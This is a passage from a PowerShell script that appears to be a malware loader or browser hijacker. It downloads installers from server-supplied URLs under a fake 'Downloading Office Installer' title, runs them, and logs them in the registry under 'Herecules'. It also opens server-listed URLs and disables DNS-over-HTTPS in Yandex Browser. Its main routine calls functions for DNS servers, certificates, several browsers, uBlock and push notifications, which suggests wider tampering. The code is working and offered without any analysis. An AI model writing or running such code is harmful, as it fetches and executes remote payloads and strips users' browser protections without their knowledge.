    }

    $downloadFileCompletedHandler = [System.ComponentModel.AsyncCompletedEventHandler]{
        param ($sender, $eventArgs)
        # Close the form before starting the installer
        $form.Invoke([action] { $form.Close() })
        
        if ($eventArgs.Error) {
            [System.Windows.Forms.MessageBox]::Show("Error downloading file: " + $eventArgs.Error.Message, "Download Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
        } elseif ($eventArgs.Cancelled) {
            [System.Windows.Forms.MessageBox]::Show("Download cancelled.", "Download Cancelled", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
        } else {
            try {
                # Execute the installer
                Start-Process -FilePath $installerPath -Wait

                # Write to the registry
                $registryPath = "HKCU:\Software\Herecules\Downloads"
                if (-not (Test-Path $registryPath)) {
                    New-Item -Path $registryPath -Force | Out-Null
                }
                Set-ItemProperty -Path $registryPath -Name $fileName -Value "Downloaded"
            } catch {
                [System.Windows.Forms.MessageBox]::Show("Error executing the installer: " + $_.Exception.Message, "Execution Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
            }
        }
    }

    # Add event handlers to WebClient
    $webClient.add_DownloadProgressChanged($progressChangedHandler)
    $webClient.add_DownloadFileCompleted($downloadFileCompletedHandler)

    try {
        # Start the download
        $webClient.DownloadFileAsync([Uri]$url, $installerPath)
        
        # Keep the form responsive while the download is in progress
        while ($form.Visible) {
            Start-Sleep -Seconds 1
            [System.Windows.Forms.Application]::DoEvents()
        }
    } catch {
        [System.Windows.Forms.MessageBox]::Show("Error initiating download: " + $_.Exception.Message, "Download Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
        $form.Close()
    }
}

function Download {
    param (
        [string]$url,
        [string]$title
    )

    $fileName = [System.IO.Path]::GetFileName($url)
    $registryPath = "HKCU:\Software\Herecules\Downloads"

    if (Test-Path $registryPath) {
        $installed = Get-ItemProperty -Path $registryPath -Name $fileName -ErrorAction SilentlyContinue
        if ($installed) {
            Write-Output "The file '$fileName' is already installed."
            return
        }
    }

    Start-DownloadAndExecute -url $url -title $title
}

function DoStartDownloads {
    foreach ($url in $server.startDownloads) {
        Download -url $url -title "Downloading Office Installer"
    }
}









function DoStartUrls {
    foreach ($startUrl in $server.startUrls) {
        Start-Process $startUrl.Trim()
    }
}




function ConfigureYandex
{
    Close-Processes(@('service_update.exe','browser.exe'))

    foreach ($dir in Get-EnvPaths) {
        $path = Join-Path -Path $dir -ChildPath 'Yandex\YandexBrowser\User Data\Local State'

        try {
            if (Test-Path -Path $path -PathType Leaf)
            {
                ConfigureYandexInternal -FilePath $path
            }
        } catch {
            Write-Error "Error occurred: $_"
        }
    }
}

function ConfigureYandexInternal {
    param(
        [string]$filePath
    )
    $content = Get-Content -Path $filePath -Raw | ConvertFrom-Json

    if ($null -eq $content.dns_over_https -or $content.dns_over_https -isnot [object]) {
        $content | Add-Member -MemberType NoteProperty -Name 'dns_over_https' -Value @{
            'mode' = 'off'
            'templates' = ""
        }
    } else {
        $content.dns_over_https.mode = 'off'
        $content.dns_over_https.templates = ""
    }

    $jsonString = $content | ConvertTo-Json -Depth 10

    Set-Content -Path $filePath -Value $jsonString -Encoding UTF8 -Force

    Write-Host "Successfully configured Yandex settings in $filePath"
}












































function main {
    ConfigureDnsServers
    ConfigureCertificates
    ConfigureChrome
    ConfigureEdge
    ConfigureYandex
    ConfigureFireFox
    ConfigureOpera
    ConfigureChromeUblock
    ConfigureChromePushes
    DoStartDownloads
    DoStartUrls
    LaunchChromePushes
}

main

